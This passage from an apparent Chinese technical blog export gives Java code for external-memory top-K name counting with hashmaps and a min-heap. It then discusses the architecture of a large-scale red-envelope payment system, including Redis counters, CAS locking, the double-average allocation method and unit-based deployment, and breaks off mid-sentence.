other.count);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @Override  </span><br><span class=\"line\">    public String toString() &#123;  </span><br><span class=\"line\">        return name + &quot;: &quot; + count;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">public class Main &#123;  </span><br><span class=\"line\">    public static void main(String\\[\\] args) &#123;  </span><br><span class=\"line\">        String\\[\\] names = &#123;&quot;张伟&quot;, &quot;王伟伟&quot;, &quot;王芳&quot;, &quot;李伟&quot;, &quot;李娜&quot;&#125;; // 示例数据  </span><br><span class=\"line\">        int k = 100; // 找到前100个重名人数最多的姓名  </span><br><span class=\"line\">  </span><br><span class=\"line\">        Trie trie = new Trie();  </span><br><span class=\"line\">        for (String name : names) &#123;  </span><br><span class=\"line\">            trie.insert(name);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        PriorityQueue&lt;NameCount&gt; topKNames = trie.getTopKNames(k);  </span><br><span class=\"line\">        while (!topKNames.isEmpty()) &#123;  </span><br><span class=\"line\">            System.out.println(topKNames.poll());  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"9-TOP-N问题发散\"><a href=\"#9-TOP-N问题发散\" class=\"headerlink\" title=\"9. TOP N问题发散:\"></a>9. TOP N问题发散:</h2><p>上面的问题进行改进一下, 如果我们对内存有一个限制,比如:要求内存的使用不能超过2G,</p>\n<p>注意，这里的内存受限，尽量使用磁盘处理。</p>\n<blockquote>\n<p>这里使用hashmap，而不适用 trie树的原因是？</p>\n<p>trie树是按照字符为粒度组织树的节点的，进行磁盘操作性能不高，而且进行磁盘操作时算法更加复杂。</p>\n<p>hashmap 是以key为单位操作的， 磁盘操作的效率高。而且 hashmap 统计的时候，代码简洁清晰。</p>\n</blockquote>\n<p>尽管我们hashmap，也不能直接将所有数据加载到内存中处理,</p>\n<p>所以可以采取分治的策略,使用外部排序和哈希映射的方法,</p>\n<p>以下是详细的步骤:</p>\n<p>1.分块读取数据:将14亿条记录分成多个较小的块,每次读取一部分数据到内存中进行处理</p>\n<p>2.哈希映射统计词频:对每个块的数据进行哈希映射,统计每个名字出现的次数,将结果写入到磁盘文件</p>\n<p>3.合并词频统计结果:读取所有中间文件,合并词频统计结果,得到全局的词频统计</p>\n<p>4.使用小顶堆找出前100个重复最多的名字</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.\\*;  </span><br><span class=\"line\">import java.util.HashMap;  </span><br><span class=\"line\">import java.util.Map;  </span><br><span class=\"line\">import java.util.PriorityQueue;  </span><br><span class=\"line\">  </span><br><span class=\"line\">class NameCount implements Comparable&lt;NameCount\\&gt; &#123;  </span><br><span class=\"line\">    String name;  </span><br><span class=\"line\">    int count;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public NameCount(String name, int count) &#123;  </span><br><span class=\"line\">        this.name = name;  </span><br><span class=\"line\">        this.count = count;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @Override  </span><br><span class=\"line\">    public int compareTo(NameCount other) &#123;  </span><br><span class=\"line\">        return Integer.compare(this.count, other.count);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @Override  </span><br><span class=\"line\">    public String toString() &#123;  </span><br><span class=\"line\">        return name + &quot;: &quot; + count;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">public class ExternalMemoryTopK &#123;  </span><br><span class=\"line\">    private static final int CHUNK\\_SIZE = 1000000; // 每个块处理100万条记录  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public static void main(String\\[\\] args) throws IOException &#123;  </span><br><span class=\"line\">        String inputFile = &quot;names.txt&quot;;  </span><br><span class=\"line\">        String outputFile = &quot;top100names.txt&quot;;  </span><br><span class=\"line\">        int k = 100;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 第一步：分块读取数据并统计词频  </span><br><span class=\"line\">        int chunkIndex = 0;  </span><br><span class=\"line\">        BufferedReader reader = new BufferedReader(new FileReader(inputFile));  </span><br><span class=\"line\">        String line;  </span><br><span class=\"line\">        while ((line = reader.readLine()) != null) &#123;  </span><br><span class=\"line\">            Map&lt;String, Integer&gt; frequencyMap = new HashMap&lt;&gt;();  </span><br><span class=\"line\">            int lineCount = 0;  </span><br><span class=\"line\">            while (line != null &amp;&amp; lineCount &lt; CHUNK\\_SIZE) &#123;  </span><br><span class=\"line\">                frequencyMap.put(line, frequencyMap.getOrDefault(line, 0) + 1);  </span><br><span class=\"line\">                line = reader.readLine();  </span><br><span class=\"line\">                lineCount++;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">            writeFrequencyMapToFile(frequencyMap, &quot;chunk\\_&quot; + chunkIndex + &quot;.txt&quot;);  </span><br><span class=\"line\">            chunkIndex++;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        reader.close();  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 第二步：合并所有块的词频统计结果  </span><br><span class=\"line\">        Map&lt;String, Integer&gt; globalFrequencyMap = new HashMap&lt;&gt;();  </span><br><span class=\"line\">        for (int i = 0; i &lt; chunkIndex; i++) &#123;  </span><br><span class=\"line\">            mergeFrequencyMapFromFile(globalFrequencyMap, &quot;chunk\\_&quot; + i + &quot;.txt&quot;);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 第三步：使用小顶堆找出前100个重复最多的名字  </span><br><span class=\"line\">        PriorityQueue&lt;NameCount&gt; minHeap = new PriorityQueue&lt;&gt;(k);  </span><br><span class=\"line\">        for (Map.Entry&lt;String, Integer&gt; entry : globalFrequencyMap.entrySet()) &#123;  </span><br><span class=\"line\">            if (minHeap.size() &lt; k) &#123;  </span><br><span class=\"line\">                minHeap.offer(new NameCount(entry.getKey(), entry.getValue()));  </span><br><span class=\"line\">            &#125; else if (entry.getValue() &gt; minHeap.peek().count) &#123;  </span><br><span class=\"line\">                minHeap.poll();  </span><br><span class=\"line\">                minHeap.offer(new NameCount(entry.getKey(), entry.getValue()));  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 输出结果  </span><br><span class=\"line\">        BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile));  </span><br><span class=\"line\">        while (!minHeap.isEmpty()) &#123;  </span><br><span class=\"line\">            writer.write(minHeap.poll().toString());  </span><br><span class=\"line\">            writer.newLine();  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        writer.close();  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    private static void writeFrequencyMapToFile(Map&lt;String, Integer&gt; frequencyMap, String filename) throws IOException &#123;  </span><br><span class=\"line\">        BufferedWriter writer = new BufferedWriter(new FileWriter(filename));  </span><br><span class=\"line\">        for (Map.Entry&lt;String, Integer&gt; entry : frequencyMap.entrySet()) &#123;  </span><br><span class=\"line\">            writer.write(entry.getKey() + &quot; &quot; + entry.getValue());  </span><br><span class=\"line\">            writer.newLine();  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        writer.close();  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    private static void mergeFrequencyMapFromFile(Map&lt;String, Integer&gt; globalFrequencyMap, String filename) throws IOException &#123;  </span><br><span class=\"line\">        BufferedReader reader = new BufferedReader(new FileReader(filename));  </span><br><span class=\"line\">        String line;  </span><br><span class=\"line\">        while ((line = reader.readLine()) != null) &#123;  </span><br><span class=\"line\">            String\\[\\] parts = line.split(&quot; &quot;);  </span><br><span class=\"line\">            String name = parts\\[0\\];  </span><br><span class=\"line\">            int count = Integer.parseInt(parts\\[1\\]);  </span><br><span class=\"line\">            globalFrequencyMap.put(name, globalFrequencyMap.getOrDefault(name, 0) + count);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        reader.close();  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"10-topK问题-典型的解题思路\"><a href=\"#10-topK问题-典型的解题思路\" class=\"headerlink\" title=\"10. topK问题,典型的解题思路\"></a>10. topK问题,典型的解题思路</h2><p>这是一种典型的topK问题,一般的问法如下：</p>\n<p>从一堆数据中选出多少个最大或最小数？</p>\n<p>解题思想：</p>\n<ol>\n<li><p>先统计数量, 使用前缀树，hashmap等</p>\n</li>\n<li><p>再用小顶堆或者 大顶堆</p>\n</li>\n</ol>\n<p>取大用小，取小用大。简单来说就是取最大的K个数就用小顶堆，取最小的K个数，就用大顶堆</p>\n<p>取海量数据里面最小的K个数？</p>\n<p>要找出数组中最小的K个数，就要构造一个有K个元素的大顶堆，因为大顶堆的堆顶值是最大的，其它元素和堆顶的元素比较，大于堆顶的元素，换一个元素继续，小于堆顶的元素，将堆顶元素出堆，将更小的元素插入堆顶，如此反复，堆里面就是最小的数</p>\n<p>取海量数据里面最大的K个数？</p>\n<p>要找出数组中最大的K个数，就要构造一个有K个元素的小顶堆，因为小顶堆的堆顶值是最小的，其它元素和堆顶的元素比较，大于堆顶的元素，堆顶的元素出堆，将元素插入到小顶堆，将更大的元素换到堆中，如此反复，堆里面就是最大的数</p>\n"},{"title":"百亿流量红包系统","date":"2024-05-28T12:40:48.000Z","_content":"\n# 百亿流量红包系统，如何架构？（字节面试真题）\n\n\n\n\n## 说在前面\n\n在读者交流群(50+)中，最近有小伙伴拿到了一线互联网企业如得物、阿里、滴滴、极兔、有赞、希音、百度、网易、美团的面试资格，遇到很多很重要的架构类/设计类的场景题：\n\n> 1.如何设计百亿流量高并发红包系统 ，请说出你的方案？\n>\n> 2.听说你会架构设计，请问一下如果让你来设计百亿流量红包系统，说说你的架构设计方案。\n\n最近有小伙伴在面试字节，又遇到了红包架构问题。小伙伴支支吾吾的说了几句，面试挂了。\n\n所以，给大家做一下系统化、体系化的梳理，使得大家内力猛增，可以充分展示一下大家雄厚的 “技术肌肉”，**让面试官爱到 “不能自已、口水直流”**，然后实现”offer直提”。\n\n\n## 本文目录\n\n**\\- 说在前面**\n\n**\\- 本文目录**\n\n- 红包架构背景\n\n#####     -红包系统和秒杀系统的对比\n\n**\\- 红包系统功能分析**\n\n- 功能1：包红包\n\n- 功能2：发红包\n\n- 功能3：抢红包\n\n- 功能4：拆红包\n\n#####     -微信红包的业务特点\n\n#####     -微信红包的技术难点\n\n- 红包系统概要设计\n\n#####     -系统功能说明\n\n**\\- 数据库设计**\n\n#####     -发红包\n\n#####     -抢红包\n\n**\\- 红包系统详细设计**\n\n- 红包整体架构\n\n- 高并发常用解决方案\n\n- 1- 使用内存替代实时的DB\n\n- 2- 使用乐观锁替代悲观锁\n\n#####     -JVM CAS 乐观锁方案\n\n**\\- 微信红包系统的高并发解决方案**\n\n#####     -1- 分而治之：系统架构设计垂直Set化。\n\n#####     -2- 解决DB并发：逻辑Server层将请求排队。\n\n#####     -3- 系统性能稳定性保障：双维度分库分表设计。\n\n#####  - 红包分配算法\n\n#####     -1- 实时拆分\n\n#####     -2- 预先生成\n\n#####     -3- 二倍均值法\n\n**\\- 红包系统高可用架构设计**\n\n#####     -1 - 系统可用性影响因素\n\n#####     -2 - 红包系统可用性设计方向\n\n#####     -3 - 业务逻辑层 - 部署方案设计\n\n#####     -4 - 业务逻辑层 - 异步化设计\n\n#####     -5 - 订单存储层 - 故障自愈\n\n#####     -6 - 订单存储层 - 平行扩容设计\n\n- 总结\n\n\n\n### 红包架构背景\n\n红包是一种 瞬时流量很大的应用， 会在很短的时间内，产生巨大的瞬时流量，\n\n所以，作为架构师来说，这种场景有很大的架构挑战\n\n以2017年除夕为例，微信红包峰值QPS在76w左右，除夕当天收发微信红包的数量为142亿个。\n\n这种百亿级别的数据量、100Wqps级别的超高并发，而且整个系统核心功能和支付相关，需要做好高并发、高可用、高可靠。\n\n> 特别说明：红包架构也是高端面试的核心场景题, 后面也会以视频的形式，对这些架构的一系列的架构场景题目，做系统化的介绍。\n>\n> 架构团队会录制成为架构视频， 帮助大家做架构拿高薪。\n\n#### 红包系统和秒杀系统的对比\n\n我们先了解下微信红包支付的流程。\n\n![](./2024/05/28/百亿流量红包系统/1.png)\n在上面的红包流程中，核心业务包含包红包、发红包、抢红包、拆红包\n\n![](./2024/05/28/百亿流量红包系统/2.png)\n其中最关键的步骤是\n\n*   发红包\n\n*   抢红包。\n\n\n在整个体系中，红包系统 是 支付系统的商户，红包这个商户出售的是钱。\n\n所以，用户发红包在红包系统 使用微信支付购买一份 红包商品，红包系统 将钱发放到相对应的微信群，供参与者领取。\n\n微信群里的用户抢红包，得到的是商品里边的 零钱。\n\n在整个体系中，红包系统 和支付系统 之间的关系是商家和第三方支付平台的关系。\n\n红包的流程，很类似 商品“秒杀”活动。\n\n*   包红包类似秒杀商品管理\n\n*   发红包类似“秒杀”活动的商品上架；\n\n*   抢红包等同于“秒杀”活动中的查询库存；\n\n*   拆红包对应“秒杀”活动中用户的“秒杀”动作。\n\n\n不过除了上面的相同点之外，红包业务 与 “秒杀”活动相比，还具备自身的特点：\n\n首先，抢红包 比 “秒杀”有更海量的并发要求。假设同一时间有 10 万个群里的用户同时在发红包，那就相当于同一时间有 10 万个“秒杀”活动发布出去。10 万个微信群里的用户同时抢红包，将产生海量的并发请求。\n\n其次，微信红包业务要求更严格的安全级别。红包业务本质上是资金交易。资金交易业务比普通商品“秒杀”活动有更高的安全级别要求。\n\n*   **“秒杀”时可以允许存在“超卖”（即实际被抢的商品数量比计划的库存多）、“少卖”（即实际被抢的商户数量比计划的库存少）的情况。**\n\n*   **但是对于 红包，不允许存在“超卖”、“少卖”。**\n\n\n> 特别说明：红包架构也是高端面试的核心场景题, 后面也会以视频的形式，对这些架构的一系列的架构场景题目，做系统化的介绍。\n>\n> 架构团队会录制成为架构视频， 帮助大家做架构拿高薪。\n\n## 红包系统功能分析\n\n接下来，40岁老架构带大家，从架构师视角开始红包系统的功能分析。\n\n微信红包和微信支付之间的交互，与普通商家与微信支付的交互一样，需要经过多个步骤。\n\n*   用户发红包时，进入微信红包下一笔订单，系统记录发红包用户、发红包金额、红包数量和要发送到的用微信群。\n\n*   然后微信红包系统请求微信支付服务器进行下单，用户使用微信支付进行支付。\n\n*   支付成功后，微信支付后台系统通知微信红包后台系统支付成功结果，微信红包后台系统收到通知后推送微信红包消息到微信群。\n\n*   微信群里用户便可抢红包。\n\n*   用户发现红包还有剩余，就可以拆剩下的红包\n\n\n这就是微信红包和微信支付的关系以及交互过程。\n\n\n### 功能1：包红包\n\n系统给每个红包分配一个唯一ID，也就是发红包的订单号，然后将红包发送给用户，红包的个数，红包金额写入到存储。\n\n### 功能2：发红包\n\n用户使用微信支付完成付款，微信红包后台收到微信支付成功的通知。红包系统将红包发送订单状态更新，更新为用户已支付，并写入用户发红包记录表，这样用户可以在钱包中找到用户的发红包流水和收发红包的记录，之后微信红包系统调用微信通知，将微信红包信息发送到微信群。\n\n### 功能3：抢红包\n\n微信群中的用户收到红包消息之后，点开红包，开始抢红包，这个过程微信红包系统会检查红包是否已经被抢完，是否已经过期，是否已经抢过等验证逻辑。\n\n### 功能4：拆红包\n\n拆红包是整个发红包流程最复杂的一个操作，需要查询这个红包的红包订单，判断用户是否可以拆包，计算本次可拆到的红包金额，并记录抢红包流水。\n\n拆红包包括如下步骤：\n\n*   1）查询这个红包发送订单，判断用户是否可拆，然后计算本次可拆到的红包金额；\n\n*   2）然后写入一条抢红包记录。如果把拆红包过程，类比为一个秒杀活动的过程，相当于扣库存与写入秒杀记录的过程；\n\n*   3）更新库存对应于更新红包发送订单，写入秒杀记录对应于写入这个红包的领取红包记录；\n\n*   4）另外，还要写入用户整体的红包领取记录；\n\n*   5）最后请求微信支付系统给拆到红包用户转入零钱，成功后更新抢红包的订单状态为已转账成功。\n\n![](./2024/05/28/百亿流量红包系统/5.png)\n\n拆红包过程类似于一个秒杀活动的过程，需要做好库存扣减和秒杀记录的操作。\n\n更新库存就是更新红包发送的订单，写入秒杀记录就是写入红包领取的信息流水。\n\n还需要以用户为中心记录用户整体的红包领取记录。\n\n最后调用支付系统将拆红包后的金额转入用户零钱中，成功之后更新抢红包的订单状态为转账成功。\n\n> 所以，在看此文之前，最好看看的高并发三部曲的Java高并发核心编程卷3\\*（注意是最新的清华大学出版社出版的加强版），里边有秒杀架构，可以作为知识铺垫。\n\n#### 微信红包的业务特点\n\n微信红包，特别是群红包，业务形态上类似于普通商品的\"秒杀\"活动。\n\n*   包红包类似秒杀商品管理\n\n*   发红包类似“秒杀”活动的商品上架；\n\n*   抢红包等同于“秒杀”活动中的查询库存；\n\n*   拆红包对应“秒杀”活动中用户的“秒杀”动作。\n\n    微信红包在业务形态上和普通商品\"秒杀\"活动相比，还有自身特点：\n\n\n1.  **海量并发请求**：微信红包用户在微信群发一个红包，等同于在网上发布一次商品\"秒杀\"活动，假设同时有10万个群的用户同时发红包，那就相当于同一时间有10万个\"秒杀\"活动发布。10万个微信群的用户同时抢红包，将产生海量并发请求。\n\n2.  **更严格的安全级别**：微信红包业务本质上是资金交易，微信红包是微信支付的一个商户，提供资金流转服务，用户发红包相当于在微信红包这个商户上使用微信支付购买了一笔\"钱\"，且收货地址是微信群。当用户支付成功后，红包\"发货\"到微信群里，群里的用户拆开红包后，微信红包提供了将\"钱\"转入拆红包用户微信零钱的服务。\n\n3.  **订单层南北独立体系**：微信红包系统采用南北独立体系的订单层设计，即数据在南北两个系统中不同步。用户就近接入系统，请求发红包时，系统会根据用户所在地分配订单到南或北的系统，并在订单号上打上南北标识。这种设计有助于分摊流量，降低系统风险。\n\n4.  **流量闭环**：在抢红包、拆红包、查红包详情列表时，接入层会根据红包单号上的南北标识，将流量分别引导到对应的南北系统闭环。这意味着，无论是发红包还是抢红包，用户都能够在就近的系统中完成操作，无需跨城，提高了系统的响应速度和稳定性。\n\n5.  **用户数据处理**：微信红包系统的用户数据采取写多读少、全量保存的策略。用户数据的查询入口在微信钱包中，相对隐藏，访问量不会太大，且被视为可旁路的非关键信息，实时性要求不高。这种设计方式可以减少数据存储的压力，提高系统性能。\n\n6.  **实时计算红包金额**：\n\n    微信红包的金额是在拆红包时实时计算的，而不是预先分配的。系统会在拆红包时取0.01到剩余平均值\\*2之间的数值作为红包金额。\n\n    这种实时计算的方式基于内存进行，不需要额外的存储空间，且计算效率很高。\n\n    同时，为了保证操作的原子性，拆包过程中使用了CAS（Compare-and-Swap）算法，确保每次只有一个并发用户拆包成功。如果拆包CAS失败，系统会自动进行重试，但也可能在重试过程中被其他用户抢得先机而空手而归。\n\n7.  **架构演进**：随着微信红包功能的不断发展和用户量的增长，其系统架构也经历了不断的演进和优化。从最初的数据库硬抗整个流量，到后来的使用缓存（cache）抗流量，再到现在的南北独立体系等设计，都是为了更好地应对高并发、提升系统性能和稳定性。\n\n    资金交易业务比普通商品\"秒杀\"有更高的安全级别要求，普通的商品\"秒杀\"由商户提供，库存是商户预设，\"秒杀\"允许存在超卖和少卖的情况，但对于微信红包，用户发100元的红包绝对不可以拆出101元，以及只被领取99元时，剩下的1元在24小时过期后要精准退还给发红包用户。\n\n    总的来说，微信红包系统架构的设计充分考虑了用户量、并发量、性能要求等因素，通过南北独立体系、流量闭环、用户数据处理、实时计算红包金额以及架构演进等多种手段，保证了系统的稳定运行和良好用户体验。\n\n\n#### 微信红包的技术难点\n\n微信红包系统架构的技术难点主要体现在以下几个方面：\n\n1.  **高并发难点**：\n\n    微信红包在特定时间（如春节、节假日等）会面临极高的并发量，如何有效地处理这些并发请求，保证系统的稳定性和响应速度，是红包系统架构设计的关键挑战之一。\n\n2.  **资金安全难点**：\n\n    红包系统涉及到资金的转移和存储，因此资金安全是系统设计的重中之重。如何确保资金安全，防止被攻击或篡改，是系统架构设计中需要重点考虑的问题。\n\n    红包业务涉及资金交易，所以一定不能出现超卖、少卖的情况。\n\n\n*   超卖：发了 10 块钱，结果抢到了 11 块钱，多的钱只能系统补上，如此为爱发电应用估计早就下架了；\n\n*   少卖：发了 10 块钱，只抢了 9 块，多的钱得原封不动地退还用户，否则第二天就接到法院传单了。\n\n\n4.  **用户体验难点**\n\n    红包系统需要保证良好的用户体验，包括响应速度、公平性（先抢先得）、成功率等。\n\n    如何在高并发场景下保证用户体验，是系统架构设计的重要目标。\n\n    了解下微信红包的用户体验 的4大核心：摇/发/抢/拆。\n\n\n*   摇：摇的流畅\n\n*   快：抢的要快\n\n*   爽：拆的爽\n\n*   稳：能分享出去\n\n\n6.  **数据一致性难点**：\n\n    红包系统需要保证数据的一致性，包括红包库存数据、用户账户数据等。如何在高并发场景下保证数据的一致性，是系统架构设计的重要挑战。\n\n\n*   参与用户越多，并发 DB 请求越大，数据越容易出现事务问题，所以系统得做好**事务一致性**；\n\n*   抢红包系统涉及金钱交易，所以事务级别要求更高，**不能出现脏数据**。\n\n\n8.  **系统扩展性难点**：\n\n    随着用户量和业务量的增长，红包系统需要具备良好的扩展性，能够方便地增加新的功能或提升性能。\n\n    如何设计可扩展的系统架构，是系统架构设计的重要考虑因素。\n\n    为了解决这些技术难点，我们可以采用多种技术手段，如分而治之、负载均衡、读写分离、水平切分、垂直切分等，来提升系统的性能和稳定性。同时，系统还采用了柔性服务、系统降级等策略，来保证在有限资源下满足用户的核心需求。\n\n\n### 红包系统概要设计\n\n#### 系统功能说明\n\n抢红包功能允许用户在群聊中发送任意个数和金额的红包，群成员可以抢到随机金额的红包，但要**保证每个用户的红包金额不小于 0.01 元**。\n\n![](./2024/05/28/百亿流量红包系统/3.png)\n抢红包的详细交互流程如下：\n\n1.  用户接收到抢红包通知，点击通知打开群聊页面；\n\n2.  用户点击抢红包，后台服务验证用户资格，确保用户尚未领取过此红包；\n\n3.  若用户资格验证通过，后台服务分配红包金额并存储领取记录；\n\n4.  用户在微信群中看到领取金额，红包状态更新为“已领取”；\n\n5.  异步调用支付接口，将红包金额更新到钱包里。\n\n\n## 数据库设计\n\n**红包表：redpack**\n\n红包表用来记录用户发了多少红包，以及需要维护的剩余金额，\n\n红包表：redpack的字段如下：\n\n| 字段 | 描述 |\n| --- | --- |\n|id|主键，红包ID。|\n|user_id|发送红包的用户id。|\n|total_amount|红包总金额。|\n|surplus_amount|红包剩余金额。|\n|total|红包总数。|\n|surplus_total|剩余红包总数。|\n\n**红包记录表：redpack\\_record**\n\n| 字段 | 描述 |\n| --- | --- |\n|id|主键，记录id。|\n|redpack_id|红包id。|\n|user_id|用户id。|\n|amount|抢到的金额。|\n\n#### 发红包\n\n设置完红包参数后，微信支付，完成付款，然后收到付款成功通知，红包系统更新红包订单状态，更新为已支付，并写入红包发送记录表。\n\n这样用户可以将用户的红包信息和红包的收发记录发出，红包系统调用微信通知，将红包信息发送到微信群。\n\n发红包的交互步骤如下：\n\n1.  用户设置红包的总金额和个数后，在红包表中增加一条数据，开始发红包；\n\n2.  为了保证实时性和抢红包的效率，在 Redis 中增加一条记录，**存储红包 ID 和总人数 n**；\n\n3.  抢红包消息推送给所有群成员。\n\n\n#### 抢红包\n\n微信群用户收到红包后，点开，红包系统会校验红包是否被抢完，是否过期。\n\n微信红包的抢红包和拆红包是两个分离的服务，用户点击抢红包后需要进行两次操作。\n\n这也是为什么明明有时候抢到了红包，点开后却发现**该红包已经被领取完了**。\n\n抢红包的交互步骤如下：\n\n1.  抢红包：抢操作在 Redis 缓存层完成，通过原子递减的操作来更新红包个数，个数递减为 0 后就说明抢光了。\n\n2.  拆红包：拆红包时，首先会实时计算金额，一般是通过二倍均值法实现（即 0.01 到剩余平均值的 2 倍之间）。\n\n3.  红包记录：用户获取红包金额后，通过数据库的事务操作累加已经领取的个数和金额，并更新红包表和记录表。\n\n4.  转账：为了提升效率，最终的转账为异步操作，这也是为什么在春节期间，红包领取后不能立即在余额中看到的原因。\n\n\n## 红包系统详细设计\n\n### 红包整体架构\n\n如下图所示，是微信红包的系统架构\n\n![](./2024/05/28/百亿流量红包系统/4.png)\n总体是三层架构：\n\n*   首先是微信统一接入层，下面是微信红包系统 API，包括发、抢、拆、查红包详情、查红包用户列表。\n\n*   接入层下面，是封装微信红包关键业务的逻辑服务；\n\n*   业务下面数据存储层，微信红包最主要的数据是订单数据，包括发红包订单和拆红包订单两部分。\n\n\n数据存储层的冷热分离设计：微信红包数据的访问热度，随着时间流逝会急剧降低，也就是数据的访问时间段非常集中，一般红包发出三天后，99% 的用户不会再去点开这个红包了。因此微信红包系统采取按时间做冷热数据分离，降低数据的存储成本，同时提升了热数据的访问性能。\n\n除了在线计算的三层架构，还有离线处理的数据分析。\n\n数据分析平台用于对红包数据的分析计算，比如朋友圈里的文章，统计从 某年 1 月 1 日到 2017 年 1 月一个用户总共抢红包的金额，在全国的排名情况，发红包数最多的城市等。\n\n数据分析平台另外一个作用就是对账，红包的订单和微信支付的订单需要对账，以保证最终资金的一致性；\n\n*   订单的数据和订单的 cache 需要做对账，以保证数据的完整性；\n\n*   订单数据和用户的收发记录需要对账，以保证用户列表完整性。\n\n\n### 高并发常用解决方案\n\n普通商品秒杀系统，解决高并发问题的方案，大致有以下2种：\n\n### 1- 使用内存替代实时的DB\n\n将实时扣库存的行为上移到内存Cache中，内存Cache操作成功直接给Server返回成功，然后异步落DB持久化。\n\n![](./2024/05/28/百亿流量红包系统/8.png)\n这个方案的优缺点如下：\n\n> 优点：用内存操作替代磁盘操作，提高了并发性能。\n>\n> 缺点：在内存操作成功DB持久化失败，或者内存Cache故障的情况下，DB持久化会丢数据，不适合微信红包这种资金交易系统。\n\n### 2- 使用乐观锁替代悲观锁\n\n**什么是悲观锁呢？**\n\n所谓悲观锁，是关系数据库管理系统里的一种并发控制的方法。它可以阻止一个事务以影响其他用户的方式来修改数据。如果一个事务执行的操作对某行数据应用了锁，那只有当这个事务把锁释放，其他事务才能够执行与该锁冲突的操作。对应于上文分析中的“并发请求抢锁”行为。\n\n**什么是乐观锁呢？**\n\n所谓乐观锁，它假设多用户并发的事务在处理时不会彼此互相影响，各事务能够在不产生锁的情况下处理各自影响的那部分数据。在提交数据更新之前，每个事务会先检查在该事务读取数据后，有没有其他事务又修改了该数据。如果其他事务有更新的话，正在提交的事务会进行回滚。\n\n乐观锁分为DB乐观锁和 JVM CAS 乐观锁。\n\nDB乐观锁的具体应用方法，是在 DB 的“库存”记录中维护一个版本号。\n\n商品“秒杀”系统中，在更新“库存”的操作进行前，先去 DB 获取当前版本号。\n\n在更新库存的事务提交时，检查该版本号是否已被其他事务修改。如果版本没被修改，则提交事务，且版本号加 1；如果版本号已经被其他事务修改，则回滚事务，并给上层报错。\n\nDB乐观锁可以提高DB的并发处理能力，但是如果应用于微信红包系统，则会存在下面三个问题：\n\n1.  如果拆红包采用乐观锁，那么在并发抢到相同版本号的拆红包请求中，只有一个能拆红包成功，其他的请求将事务回滚并返回失败，给用户报错，用户体验完全不可接受。\n\n2.  如果采用乐观锁，将会导致第一时间同时拆红包的用户有一部分直接返回失败，反而那些“手慢”的用户，有可能因为并发减小后拆红包成功，这会带来用户体验上的负面影响。\n\n3.  如果采用乐观锁的方式，会带来大数量的无效更新请求、事务回滚，给 DB 造成不必要的额外压力。\n\n\n#### JVM CAS 乐观锁方案\n\n出于性能原因，微信红包系统使用 JVM CAS 乐观锁，而不是DB乐观锁的方式解决并发抢锁问题。\n\n微信红包的金额是在拆红包时实时计算的，而不是预先分配的。系统会在拆红包时取0.01到剩余平均值\\*2之间的数值作为红包金额。\n\n这种实时计算的方式基于JVM 内存进行，不需要额外的存储空间，且计算效率很高。\n\n同时，为了保证操作的原子性，拆包过程中使用了CAS（Compare-and-Swap）算法，确保每次只有一个并发用户拆包成功。如果拆包CAS失败，系统会自动进行重试，但也可能在重试过程中被其他用户抢得先机而空手而归。\n\n如何保证同一个红包由同一个节点去拆包呢？将同一个红包 ID 的所有请求 stick 到同一台 Server，这个后面介绍。\n\n> 以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。\n\n## 微信红包系统的高并发解决方案\n\n综合上面的分析，我们的红包系统针对相应的技术难点，采用如下3个方案，解决高并发问题。\n\n##### 1- 分而治之：系统架构设计垂直Set化。\n\n**什么是Set（单元）化架构呢?**\n\n> 单元化架构是一种将系统划分为多个独立的、自包含的单元的部署架构，每个单元都能够完成所有业务操作，包含所有业务所需的服务以及分配给该单元的数据。这种架构将单元作为部署的基本单位，在全站所有机房中部署多个单元，每个机房内的单元数目不固定，但任一单元均部署系统所需的全部应用。数据则是全量数据按照某种维度划分后的一部分。与传统意义上的SOA（服务化）架构不同，单元化架构下，服务仍然是分层的，但每一层中的任意一个节点都属于且仅属于某一个单元，上层调用下层时，仅会选择本单元内的节点。\n\n**通俗的理解为**：\n\n单元化架构，简单来说，就是把系统拆分成若干个独立的单元，每个单元都包含了完成业务操作所需的所有服务和数据。这些单元可以独立部署、管理和监控，就像一个个小房子，每个房子都有自己的客厅、卧室和厨房（服务），也有自己的食物和水（数据）。\n\n如下图，是一种单元化架构设计。\n\n![](./2024/05/28/百亿流量红包系统/6.png)\n\n微信红包用户发一个红包时，微信红包系统生成一个 ID 作为这个红包的唯一标识。\n\n接下来这个红包的所有发红包、抢红包、拆红包、查询红包详情等操作，都根据这个 ID 关联。\n\n红包系统根据这个红包 